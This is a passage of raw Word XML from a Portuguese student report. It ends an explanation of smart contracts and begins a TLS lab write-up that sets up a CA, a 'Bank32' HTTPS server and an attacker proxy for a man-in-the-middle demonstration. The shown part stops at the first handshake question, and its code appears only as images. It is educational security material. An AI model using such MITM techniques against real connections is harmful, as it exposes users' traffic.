      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">” (ou contrato inteligente) é um programa digital que </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>executa automaticamente regras e condições pré-definidas dentro de uma blockchain</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>, sem necessidade de intermediários.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51297D8A" w14:textId="4D8DA83D" w:rsidR="00A04B3D" w:rsidRPr="00236B3B" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">É muito utilizado na rede “Ethereum”, </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>onde permite realizar transações seguras e automáticas entre partes que não se conhecem ou não confiam uma na outra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E26B38E" w14:textId="4E7C0D1E" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">De forma simples, um “Smart Contract” funciona como um </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>contrato tradiciona</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">l, mas em vez de estar escrito em papel, está codificado num </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>sistema informático</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">. Quando as condições definidas são cumpridas, o </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>contrato executa-se sozinho.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC30894" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00236B3B" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:pPr>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Imaginemos que quer emprestar 5 moedas “Ethereum” a alguém, mas </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>não confia totalmente que essa pessoa as devolva</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>. Pode então criar um “Smart Contract” que define as regras</w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>: se o valor não for devolvido até uma data específica, o contrato reverte automaticamente a transação e o dinheiro regressa à sua conta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2D063C" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA"/>
    <w:p w14:paraId="6054F7FF" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:r w:rsidRPr="00A04B3D">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Assim, os </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>“Smart Contracts</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidRPr="00236B3B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>garantem transparência, segurança e autonomia</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>, eliminando a necessidade de confiar em terceiros ou depender de intermediários como bancos ou advogados.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3E508F" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D39554A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B89A849" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B09DF66" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34CC0E98" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13589C16" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4968BAAE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51CE7203" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77F8BDE5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C99EE1C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc213874697"/>
      <w:bookmarkStart w:id="12" w:name="_Toc213881895"/>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Transport Layer Security (TLS) Lab - Resolução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="58505BA5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DD8C0FB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="X9b925a063b61cb50dc82e09a27db09420b5f20f"/>
    </w:p>
    <w:p w14:paraId="1F701036" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc213874698"/>
      <w:bookmarkStart w:id="15" w:name="_Toc213881896"/>
      <w:r>
        <w:t>Introdução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="292AB5D8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Este lab explora o protocolo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Transport Layer Security (TLS)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">, utilizado para proteger comunicações na Internet (HTTPS). </w:t>
      </w:r>
      <w:r>
        <w:t>O objetivo é compreender:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668EEB38" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Como funciona o handshake TLS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E2B5B0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Public Key Infrastructure (PKI) e certificados</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B60DB74" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Implementação de clientes e servidores TLS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCFEC06" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Vulnerabilidades quando a PKI é comprometida (ataques MITM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9E77D3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O script na pasta scripts do gtihub automatiza todo o processo de configuração e demonstração do lab, incluindo: - Criação de uma Certificate Authority (CA) - Geração de certificados para servidor - Implementação de servidor HTTPS (Bank32) - Implementação de proxy MITM (Antixerox) - Demonstração do ataque Man-In-The-Middle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2667A4BB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Todos os diagramas e esquemas foram gerados pelo GPT, assim evitamos perdas de tempos e poupamos trabalho.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712773EB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49B36719" wp14:editId="0287142F">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="762779990" name="Retângulo 3"/>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7C9A8026" id="Retângulo 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p>
    <w:p w14:paraId="11970459" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="698E751D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc213874699"/>
      <w:bookmarkStart w:id="17" w:name="_Toc213881897"/>
      <w:r>
        <w:t>Arquitetura da rede</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="192FCEE0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O lab utiliza três containers Docker com a seguinte topologia:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A202C15" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="131E0A58" wp14:editId="027F9F73">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="967106"/>
            <wp:effectExtent l="0" t="0" r="0" b="4444"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="163771862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967106"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="18" w:name="arquitetura-da-rede"/>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="1F481120" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc213874700"/>
      <w:bookmarkStart w:id="20" w:name="componentes-principais"/>
      <w:bookmarkStart w:id="21" w:name="_Toc213881898"/>
      <w:r>
        <w:t>Componentes Principais</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="2AC5B6E4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Server (10.9.0.43)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Servidor HTTPS legítimo “Bank32”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E06207E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Proxy (10.9.0.143)</w:t>
      </w:r>
      <w:r>
        <w:t>: Atacante que realiza MITM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C196F8B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Client (10.9.0.5)</w:t>
      </w:r>
      <w:r>
        <w:t>: Cliente/vítima</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D90563" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Host VM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Browser usado para testes</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="4EB04AEE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc213874701"/>
      <w:bookmarkStart w:id="23" w:name="_Toc213881899"/>
      <w:r>
        <w:t>Certificados e PKI</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="5C376D7E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O script cria a seguinte estrutura de certificados:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55705D3A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7514C236" wp14:editId="386B7DBE">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="1714500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="1495723106"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714500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="24" w:name="introdução"/>
    <w:bookmarkStart w:id="25" w:name="certificados-e-pki"/>
    <w:p w14:paraId="52B56DD5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EC3B0A0" wp14:editId="045BB25C">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="671063247" name="Retângulo 7"/>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245F5EC9" id="Retângulo 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bookmarkEnd w:id="24"/>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="15437693" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="582891FC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc213874702"/>
      <w:bookmarkStart w:id="27" w:name="_Toc213881900"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Task 1: TLS Client</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="27754D4F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc213874703"/>
      <w:bookmarkStart w:id="29" w:name="task-1.a-tls-handshake"/>
      <w:bookmarkStart w:id="30" w:name="_Toc213881901"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Task 1.a: TLS Handshake</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="5A23A497" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Código Implementado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246E2D58" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31CE3F71" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251661312" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4CD62ACB" wp14:editId="4F349080">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5466712" cy="1990721"/>
            <wp:effectExtent l="0" t="0" r="638" b="0"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="425852695"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66712" cy="1990721"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="31" w:name="código-implementado"/>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="5064ADEA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4170B802" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5001F1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:bookmarkStart w:id="32" w:name="questões-respondidas"/>
      <w:r>
        <w:t>Questões Respondidas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44672C87" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>1. Qual o cipher usado entre cliente e servidor?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452416CD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">O cipher utilizado pode ser obtido com </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>ssock.cipher()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>. Tipicamente, será algo como:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148B958F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2E9867C7" wp14:editId="27D1F8A3">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5485769" cy="695328"/>
            <wp:effectExtent l="0" t="0" r="631" b="9522"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="180883306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5769" cy="695328"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F555AE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Isto indica: - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>ECDHE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
